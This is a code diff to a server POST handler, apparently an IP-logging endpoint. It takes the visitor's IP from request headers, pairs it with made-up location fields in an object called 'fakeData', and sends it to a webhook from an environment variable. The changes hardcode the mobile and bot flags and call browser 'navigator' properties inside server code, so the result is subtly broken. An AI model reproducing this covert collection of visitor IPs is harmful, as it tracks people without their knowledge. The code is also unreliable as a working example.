@@ -3,12 +3,6 @@ export async function POST(request) {
                request.headers.get('cf-connecting-ip') || 
                request.ip;
     
-    const payload = await request.json();
-    const userAgent = payload.userAgent;
-    
-    const browser = userAgent.includes('Chrome') ? 'Chrome' : 
-                   userAgent.includes('Firefox') ? 'Firefox' : 'Other';
-    
     const fakeData = {
         ip: ip,
         provider: 'Hidden ISP',
@@ -18,15 +12,15 @@ export async function POST(request) {
         city: 'San Francisco',
         coords: [37.7749, -122.4194],
         timezone: 'America/Los_Angeles',
-        mobile: userAgent.includes('Mobile'),
+        mobile: true,
         vpn: false,
-        bot: userAgent.includes('bot') || userAgent.includes('crawler'),
+        bot: false,
         os: navigator.platform,
-        browser: browser
+        browser: navigator.userAgent.includes('Chrome') ? 'Chrome' : 'Other'
     };
     
     try {
-        const response = await fetch(process.env.WEBHOOK_URL, {
+        await fetch(process.env.WEBHOOK_URL, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({content: JSON.stringify(fakeData)})
@@ -35,7 +29,3 @@ export async function POST(request) {
     
     return new Response(JSON.stringify({status: 'success'}));
 }
-
-export const config = {
-    runtime: 'edge'
-};
